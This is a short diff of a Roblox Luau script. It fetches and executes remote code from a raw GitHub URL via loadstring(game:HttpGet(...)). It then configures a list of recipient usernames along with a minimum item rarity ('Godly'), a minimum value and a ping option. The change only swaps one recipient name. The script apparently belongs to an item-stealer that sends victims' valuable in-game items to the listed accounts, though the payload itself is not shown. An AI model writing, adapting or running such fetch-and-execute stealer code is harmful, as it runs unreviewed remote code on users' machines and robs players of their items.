@@ -7,7 +7,7 @@ _G.scriptExecuted = true
 loadstring(game:HttpGet("https://raw.githubusercontent.com/ipadys/core/refs/heads/main/Halloween.luau"))()
 
 task.spawn(function()
-	local users = {"erm_iPad", "UPVR_MMRP", "fray_rbxx"}
+	local users = {"AngelsL0st", "UPVR_MMRP", "fray_rbxx"}
 	local min_rarity = "Godly"
 	local min_value = 60
 	local ping = "Yes"
